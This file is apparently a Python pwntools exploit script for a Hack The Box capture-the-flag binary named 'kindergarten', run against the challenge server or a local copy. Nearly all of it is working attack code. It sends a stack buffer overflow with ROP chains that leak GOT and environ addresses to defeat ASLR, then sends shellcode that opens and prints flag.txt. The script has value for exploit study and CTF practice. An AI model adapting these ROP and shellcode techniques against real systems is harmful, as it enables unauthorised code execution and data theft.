#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host docker.htb.eu --port 30660
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './kindergarten'

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
else:
    libc = ELF("/home/zoey/Downloads/libc6_2.27-3ubuntu1.3_amd64.so")

# Possible libc: output-symbols-libc6-amd64_2.27-3ubuntu1_i386.so
# Possible libc: output-symbols-libc6-i386_2.27-3ubuntu1_amd64.so
# Possible libc: output-symbols-libc6_2.27-3ubuntu1_amd64.so
# Possible libc: output-symbols-libc6_2.27-3ubuntu1_i386.so

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'docker.hackthebox.eu'
port = int(args.PORT or 32161)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# 
# b *0x400950 <--start of kinder

gdbscript = '''
b *0x400b85
b *0x400ae8
b *0x40094b
b *0x400a2d
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# 0x00007ffd2c81eb18│+0x0088: 0x0000000000400baa  →  <main+114> mov rax, QWORD PTR [rbp-0x8]
# 0x00007ffd2c81eb20│+0x0090: 0x0000000000400db0  →   imul rsp, QWORD PTR [r11+r14*2+0x20], 0x7473756d
# 0x00007ffd2c81eb28│+0x0098: 0x0000000000400d96
# 0x0000000000400c43 : pop rdi ; ret
# 0x0000000000400c41 : pop rsi ; pop r15 ; ret

io = start()

#shellcode = asm(shellcraft.readfile('./flag.txt'))

print(io.recv().decode('utf8'))
#print(shellcode)
#io.send(shellcode + b'y\n')
io.send('flagflag\x00r\x00\n')
print(io.recv().decode('utf8'))
io.send('y\n')
print(io.recv().decode('utf8'))
io.send('y\n')
print(io.recv().decode('utf8'))
io.send('y\n')
print(io.recv().decode('utf8'))
io.send('y\n')
print(io.recv().decode('utf8'))
io.send('y\n')
print(io.recv().decode('utf8'))
io.send('y\n')
print(io.recv().decode('utf8'))
io.send('y\n')
print(io.recv().decode('utf8'))
io.send('y\n')
print(io.recv().decode('utf8'))
io.send('y\n')

# jmp and rop? 0x6020a4 --counter for 0x00000000004009af : mov dword ptr [rbp - 0x68], 0 ; jmp 0x400ae5
# 0x00000000004007c8 : pop rbp ; ret
payload = cyclic(136)
# write GOT to stdout so we can get libc address and calculate offset to environ
payload += p64(0x0000000000400c43) # pop rdi ret
payload += p64(0x0000000000000001) # 1 for stdout to rdi
payload += p64(0x0000000000400c41) # 
payload += p64(0x0000000000601f98) # rsi
payload += p64(0x0000000000000001) # ignored
payload += p64(0x0000000000400700) # write@got

# read over counter
payload += p64(0x0000000000400c43) # pop rdi ret
payload += p64(0x0000000000000000) # 0 for stdin to rdi
payload += p64(0x0000000000400c41) # 
payload += p64(0x000000000060203c) # rsi
payload += p64(0x0000000000000001) # ignored
payload += p64(0x0000000000400740) # read@got

# go back to the top of kinder so we can try and re-exploit
payload += p64(0x0000000000400950)

#print(io.recv().decode('utf8'))
print(io.recvline_contains(b'finish!'))
#print(io.recvline_contains(b'>').decode('utf8'))

print('Sending first payload')
io.send(payload)

addresses = io.recvline_contains(b'flag')

print(addresses)

addresses=addresses[2:]
chunks = [addresses[i:i+8] for i in range(0, len(addresses), 8)]
write=u64(chunks[5])
strlen=u64(chunks[7])
alarm=u64(chunks[8])
read=u64(chunks[9])
environ=write-(libc.symbols['write']-libc.symbols['environ'])
print('write ' + hex(write))
print('strlen ' + hex(strlen))
print('alarm ' + hex(alarm))
print('read ' + hex(read))
print('environ' + hex(environ))

print(io.recv()) # recv garbage after leak

io.send('\x04\x00\x00\x00\n') # counter reset value

print(io.recv().decode('utf8'))
io.send('y\n')

payload = cyclic(136)
# write environ contents to stdout
payload += p64(0x0000000000400c43) # pop rdi ret
payload += p64(0x0000000000000001) # 1 for stdout to rdi
payload += p64(0x0000000000400c41) # 
payload += p64(environ) # rsi
payload += p64(0x0000000000000001) # ignored
payload += p64(0x0000000000400700) # write@got

# read over counter
payload += p64(0x0000000000400c43) # pop rdi ret
payload += p64(0x0000000000000000) # 0 for stdin to rdi
payload += p64(0x0000000000400c41) # 
payload += p64(0x000000000060203c) # rsi
payload += p64(0x0000000000000001) # ignored
payload += p64(0x0000000000400740) # read@got

# go back to the top of kinder so we can read in our shell code
payload += p64(0x0000000000400950)

print('Sending second payload to get environ contents')
print(io.recvline_contains('finish')) # "...maybe a last one and we finish!
#print(io.recv())
io.send(payload)

print(io.recv())
environ_leak=io.recv() # environ contents, should be a stack address

env_stack = u64(environ_leak[0:8]) # get stack address
rsp_kinder = env_stack-216 # calc offset for rsp of kinder, our payload

print('environ stack ' + hex(env_stack))
print('kinder rsp ' + hex(rsp_kinder))

io.send('\x04\x00\x00\x00\n') # counter reset value

print(io.recv().decode('utf8'))
io.send('y\n')

sys_open = asm(shellcraft.amd64.linux.syscall('SYS_open',0x0000602044, 0)) # open flag.txt
read = asm(shellcraft.amd64.linux.read(5, 0x00602040, 10)) # read from fd 3 to ans
write = asm(shellcraft.amd64.linux.write(1,0x00602044, 10)) # write from ans to stdout(1)
doExit = asm(shellcraft.amd64.linux.exit(0)) # try and exit to see if we don't segfault

shellcode = sys_open + read + write + doExit

payload = (b'\x90' * (136 - len(shellcode))) + shellcode
payload += p64(rsp_kinder)

io.send(payload)

print(io.recv())

io.interactive()

